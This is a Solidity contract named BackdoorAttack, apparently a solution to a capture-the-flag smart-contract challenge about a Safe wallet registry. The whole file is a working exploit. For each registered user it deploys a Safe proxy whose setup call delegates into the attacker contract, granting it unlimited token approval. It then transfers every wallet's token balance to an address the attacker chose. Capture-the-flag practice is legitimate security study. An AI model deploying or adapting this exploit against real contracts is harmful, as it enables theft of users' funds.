// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";


contract BackdoorAttack {
    IERC20 public token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    address[] users;
    address player;
    WalletRegistry walletRegistry;

    address recovery;

    constructor(
        address _token,
        address _walletFactory,
        address _singletonCopy,
        address[] memory _users,
        address _walletRegistry,
        address _recovery
    ) {
        token = IERC20(_token);
        walletFactory = SafeProxyFactory(_walletFactory);
        singletonCopy = Safe(payable(_singletonCopy));

        users = _users;
        walletRegistry = WalletRegistry(_walletRegistry);

        recovery = _recovery;
    }

    function attack() public {
        bytes memory attackData = abi.encodeWithSignature("approve(address,address)", address(token), address(this));
        address[] memory wallets = new address[](users.length);

        for (uint i = 0; i < users.length; i++) {
            address[] memory walletOwners = new address[](1);
            walletOwners[0] = users[i];

            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                walletOwners, // _owners
                1, // _threshold
                address(this), // to
                attackData, // data
                address(0), // fallbackHandler
                address(0), // paymentToken
                0, // payment
                address(0) // paymentReceiver
            );

            wallets[i] = address(
                walletFactory.createProxyWithCallback(
                    address(singletonCopy),
                    initializer,
                    1,
                    walletRegistry
                )
            );
        }

        for (uint i = 0; i < wallets.length; i++) {
            IERC20(token).transferFrom(wallets[i], address(recovery), token.balanceOf(wallets[i]));
        }
    }

    function approve(address _token, address _spender) external {
        IERC20(_token).approve(_spender, type(uint256).max);
    }
   
}
